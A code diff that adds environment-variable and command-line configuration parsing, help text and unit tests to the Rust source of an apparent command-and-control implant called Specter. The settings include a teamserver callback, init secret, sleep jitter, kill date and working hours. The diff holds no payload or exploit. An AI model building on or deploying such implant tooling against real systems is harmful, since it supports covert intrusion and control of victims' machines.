@@ -1,5 +1,7 @@
 //! Agent configuration for the Specter implant.
 
+use std::ffi::{OsStr, OsString};
+
 use crate::error::SpecterError;
 
 /// Configuration for the Specter agent.
@@ -52,6 +54,27 @@ pub struct SpecterConfig {
 }
 
 impl SpecterConfig {
+    /// Build a configuration from command-line arguments and environment variables.
+    ///
+    /// Environment variables are applied first and may be overridden by CLI flags:
+    /// `SPECTER_CALLBACK_URL`, `SPECTER_INIT_SECRET`, `SPECTER_USER_AGENT`,
+    /// `SPECTER_SLEEP_DELAY_MS`, `SPECTER_SLEEP_JITTER`, `SPECTER_KILL_DATE`,
+    /// and `SPECTER_WORKING_HOURS`.
+    pub fn from_sources<I, S, J, K, V>(args: I, env: J) -> Result<Self, SpecterError>
+    where
+        I: IntoIterator<Item = S>,
+        S: Into<OsString>,
+        J: IntoIterator<Item = (K, V)>,
+        K: Into<OsString>,
+        V: Into<OsString>,
+    {
+        let mut config = Self::default();
+        config.apply_env(env)?;
+        config.apply_args(args)?;
+        config.validate()?;
+        Ok(config)
+    }
+
     /// Validate the configuration, returning an error if any field is invalid.
     pub fn validate(&self) -> Result<(), SpecterError> {
         if self.callback_url.is_empty() {
@@ -63,6 +86,119 @@ impl SpecterConfig {
         if self.sleep_jitter > 100 {
             return Err(SpecterError::InvalidConfig("sleep_jitter must be 0–100"));
         }
+        Ok(())
+    }
+
+    /// Return CLI help text for the Specter binary.
+    pub fn usage() -> &'static str {
+        concat!(
+            "Usage: specter [options]\n\n",
+            "Options:\n",
+            "  --callback-url URL       Teamserver callback endpoint\n",
+            "  --init-secret SECRET     HKDF listener init secret\n",
+            "  --user-agent VALUE       HTTP User-Agent header\n",
+            "  --sleep-delay-ms N       Base sleep interval in milliseconds\n",
+            "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
+            "  --kill-date UNIX_TS      Exit after this Unix timestamp\n",
+            "  --working-hours MASK     Working-hours bitmask advertised in init\n",
+            "  -h, --help               Show this help text\n\n",
+            "Environment:\n",
+            "  SPECTER_CALLBACK_URL, SPECTER_INIT_SECRET, SPECTER_USER_AGENT,\n",
+            "  SPECTER_SLEEP_DELAY_MS, SPECTER_SLEEP_JITTER, SPECTER_KILL_DATE,\n",
+            "  SPECTER_WORKING_HOURS, SPECTER_PINNED_CERT_PEM\n",
+        )
+    }
+
+    fn apply_env<J, K, V>(&mut self, env: J) -> Result<(), SpecterError>
+    where
+        J: IntoIterator<Item = (K, V)>,
+        K: Into<OsString>,
+        V: Into<OsString>,
+    {
+        for (key, value) in env {
+            let key = key.into();
+            let value = value.into();
+            match key.to_str() {
+                Some("SPECTER_CALLBACK_URL") => {
+                    self.callback_url = parse_os_string(value, "SPECTER_CALLBACK_URL")?;
+                }
+                Some("SPECTER_INIT_SECRET") => {
+                    self.init_secret = Some(parse_os_string(value, "SPECTER_INIT_SECRET")?);
+                }
+                Some("SPECTER_USER_AGENT") => {
+                    self.user_agent = parse_os_string(value, "SPECTER_USER_AGENT")?;
+                }
+                Some("SPECTER_SLEEP_DELAY_MS") => {
+                    self.sleep_delay_ms = parse_os_value(&value, "SPECTER_SLEEP_DELAY_MS")?;
+                }
+                Some("SPECTER_SLEEP_JITTER") => {
+                    self.sleep_jitter = parse_os_value(&value, "SPECTER_SLEEP_JITTER")?;
+                }
+                Some("SPECTER_KILL_DATE") => {
+                    self.kill_date = Some(parse_os_value(&value, "SPECTER_KILL_DATE")?);
+                }
+                Some("SPECTER_WORKING_HOURS") => {
+                    self.working_hours = Some(parse_os_value(&value, "SPECTER_WORKING_HOURS")?);
+                }
+                Some("SPECTER_PINNED_CERT_PEM") => {
+                    self.pinned_cert_pem = Some(parse_os_string(value, "SPECTER_PINNED_CERT_PEM")?);
+                }
+                _ => {}
+            }
+        }
+
+        Ok(())
+    }
+
+    fn apply_args<I, S>(&mut self, args: I) -> Result<(), SpecterError>
+    where
+        I: IntoIterator<Item = S>,
+        S: Into<OsString>,
+    {
+        let mut args = args.into_iter().map(Into::into);
+        let _program_name = args.next();
+
+        while let Some(argument) = args.next() {
+            let argument_string = parse_os_string(argument, "argument")?;
+            if matches!(argument_string.as_str(), "-h" | "--help") {
+                continue;
+            }
+
+            let (flag, inline_value) = match argument_string.split_once('=') {
+                Some((flag, value)) => (flag, Some(value.to_string())),
+                None => (argument_string.as_str(), None),
+            };
+
+            let value = match inline_value {
+                Some(value) => value,
+                None => {
+                    let next = args.next().ok_or_else(|| {
+                        SpecterError::Argument(format!("missing value for {flag}"))
+                    })?;
+                    parse_os_string(next, flag)?
+                }
+            };
+
+            match flag {
+                "--callback-url" => self.callback_url = value,
+                "--init-secret" => self.init_secret = Some(value),
+                "--user-agent" => self.user_agent = value,
+                "--sleep-delay-ms" => {
+                    self.sleep_delay_ms = parse_string_value(&value, flag)?;
+                }
+                "--sleep-jitter" => {
+                    self.sleep_jitter = parse_string_value(&value, flag)?;
+                }
+                "--kill-date" => {
+                    self.kill_date = Some(parse_string_value(&value, flag)?);
+                }
+                "--working-hours" => {
+                    self.working_hours = Some(parse_string_value(&value, flag)?);
+                }
+                _ => return Err(SpecterError::Argument(format!("unknown argument {flag}"))),
+            }
+        }
+
         Ok(())
     }
 }
@@ -97,6 +233,29 @@ impl Default for SpecterConfig {
     }
 }
 
+fn parse_os_string(value: OsString, key: &str) -> Result<String, SpecterError> {
+    value.into_string().map_err(|_| SpecterError::Argument(format!("{key} must be valid UTF-8")))
+}
+
+fn parse_os_value<T>(value: &OsStr, key: &str) -> Result<T, SpecterError>
+where
+    T: std::str::FromStr,
+{
+    let value = value
+        .to_str()
+        .ok_or_else(|| SpecterError::Argument(format!("{key} must be valid UTF-8")))?;
+    parse_string_value(value, key)
+}
+
+fn parse_string_value<T>(value: &str, key: &str) -> Result<T, SpecterError>
+where
+    T: std::str::FromStr,
+{
+    value
+        .parse::<T>()
+        .map_err(|_| SpecterError::Argument(format!("invalid value for {key}: {value}")))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -123,5 +282,104 @@ mod tests {
     fn empty_init_secret_is_invalid() {
         let config = SpecterConfig { init_secret: Some(String::new()), ..Default::default() };
         assert!(config.validate().is_err());
+    }
+
+    #[test]
+    fn from_sources_applies_environment_values() {
+        let config = SpecterConfig::from_sources(
+            ["specter"],
+            [
+                ("SPECTER_CALLBACK_URL", "https://teamserver.local/"),
+                ("SPECTER_USER_AGENT", "specter-test"),
+                ("SPECTER_SLEEP_DELAY_MS", "1500"),
+                ("SPECTER_SLEEP_JITTER", "15"),
+                ("SPECTER_KILL_DATE", "1700000000"),
+                ("SPECTER_WORKING_HOURS", "255"),
+                ("SPECTER_INIT_SECRET", "sekrit"),
+            ],
+        )
+        .expect("config");
+
+        assert_eq!(config.callback_url, "https://teamserver.local/");
+        assert_eq!(config.user_agent, "specter-test");
+        assert_eq!(config.sleep_delay_ms, 1500);
+        assert_eq!(config.sleep_jitter, 15);
+        assert_eq!(config.kill_date, Some(1_700_000_000));
+        assert_eq!(config.working_hours, Some(255));
+        assert_eq!(config.init_secret.as_deref(), Some("sekrit"));
+        assert!(config.pinned_cert_pem.is_none());
+    }
+
+    #[test]
+    fn from_sources_applies_pinned_cert_pem_from_env() {
+        let config = SpecterConfig::from_sources(
+            ["specter"],
+            [
+                ("SPECTER_CALLBACK_URL", "https://teamserver.local/"),
+                (
+                    "SPECTER_PINNED_CERT_PEM",
+                    "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n",
+                ),
+            ],
+        )
+        .expect("config");
+
+        assert_eq!(
+            config.pinned_cert_pem.as_deref(),
+            Some("-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n")
+        );
+    }
+
+    #[test]
+    fn from_sources_prefers_cli_over_environment() {
+        let config = SpecterConfig::from_sources(
+            [
+                "specter",
+                "--callback-url",
+                "https://override.local/",
+                "--sleep-delay-ms=2500",
+                "--sleep-jitter",
+                "5",
+            ],
+            [("SPECTER_CALLBACK_URL", "https://env.local/"), ("SPECTER_SLEEP_DELAY_MS", "1000")],
+        )
+        .expect("config");
+
+        assert_eq!(config.callback_url, "https://override.local/");
+        assert_eq!(config.sleep_delay_ms, 2500);
+        assert_eq!(config.sleep_jitter, 5);
+    }
+
+    #[test]
+    fn from_sources_rejects_unknown_arguments() {
+        let error = SpecterConfig::from_sources(
+            ["specter", "--bogus", "value"],
+            std::iter::empty::<(&str, &str)>(),
+        )
+        .expect_err("unknown flag should fail");
+        assert!(matches!(
+            error,
+            SpecterError::Argument(message) if message.contains("--bogus")
+        ));
+    }
+
+    #[test]
+    fn from_sources_rejects_invalid_numeric_values() {
+        let error = SpecterConfig::from_sources(
+            ["specter", "--sleep-jitter", "oops"],
+            std::iter::empty::<(&str, &str)>(),
+        )
+        .expect_err("invalid number should fail");
+        assert!(matches!(
+            error,
+            SpecterError::Argument(message) if message.contains("--sleep-jitter")
+        ));
+    }
+
+    #[test]
+    fn usage_mentions_supported_inputs() {
+        let usage = SpecterConfig::usage();
+        assert!(usage.contains("--callback-url"));
+        assert!(usage.contains("SPECTER_CALLBACK_URL"));
     }
 }
